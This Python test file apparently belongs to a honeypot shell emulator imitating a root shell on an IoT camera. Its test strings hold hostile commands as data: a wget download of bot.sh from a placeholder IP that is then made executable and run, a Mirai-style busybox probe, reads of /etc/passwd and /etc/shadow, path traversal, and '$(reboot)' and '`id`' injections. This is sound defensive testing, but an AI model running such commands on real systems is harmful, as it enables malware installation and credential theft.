from services.shell_emulator import MAX_FILES, ShellSession


def test_basic_identity():
    shell = ShellSession()
    assert shell.run("whoami") == "root\n"
    assert "uid=0(root)" in shell.run("id")
    assert "armv7l" in shell.run("uname -a")
    assert shell.prompt == "root@iot-camera:~# "


def test_downloaded_file_appears_and_can_be_removed():
    shell = ShellSession()
    shell.run("cd /tmp")
    assert shell.prompt == "root@iot-camera:/tmp# "
    assert "bot.sh" not in shell.run("ls")

    output = shell.run("wget http://198.51.100.7/bot.sh")
    assert "198.51.100.7" in output and "100%" in output
    assert "bot.sh" in shell.run("ls")
    assert shell.run("chmod +x bot.sh") == ""
    assert shell.run("./bot.sh") == ""

    shell.run("rm bot.sh")
    assert "bot.sh" not in shell.run("ls")
    assert "not found" in shell.run("./bot.sh")


def test_chained_commands_and_redirect():
    shell = ShellSession()
    output = shell.run("cd /tmp && echo hello > note.txt; cat note.txt")
    assert output == "hello\n"
    assert shell.run("echo more >> note.txt; cat note.txt") == "hello\nmore\n"
    assert shell.run("echo quiet > /dev/null 2>&1") == ""


def test_busybox_applet_probe():
    shell = ShellSession()
    assert shell.run("/bin/busybox MIRAI") == "MIRAI: applet not found\n"
    assert "BusyBox v1.24.1" in shell.run("busybox")
    assert shell.run("busybox whoami") == "root\n"


def test_file_reads():
    shell = ShellSession()
    assert "root:x:0:0" in shell.run("cat /etc/passwd")
    assert "Permission denied" in shell.run("cat /etc/shadow")
    assert "No such file" in shell.run("cat /nope")
    assert "No such file" in shell.run("cd /nope")


def test_unknown_command_and_exit():
    shell = ShellSession()
    assert shell.run("frobnicate --now") == "-sh: frobnicate: not found\n"
    assert not shell.closed
    shell.run("exit")
    assert shell.closed


def test_file_quota_is_enforced():
    shell = ShellSession()
    shell.run("cd /tmp")
    for index in range(MAX_FILES + 20):
        shell.run(f"touch f{index}")
    assert len(shell.user_files) == MAX_FILES


def test_hostile_input_does_not_raise():
    shell = ShellSession()
    for line in ['echo "unterminated', ";;;;", "|||", "cat " + "../" * 500 + "etc/passwd",
                 "\x00\x01\x02", "> > >", "cd " + "a" * 5000, "$(reboot)", "`id`"]:
        assert isinstance(shell.run(line), str)
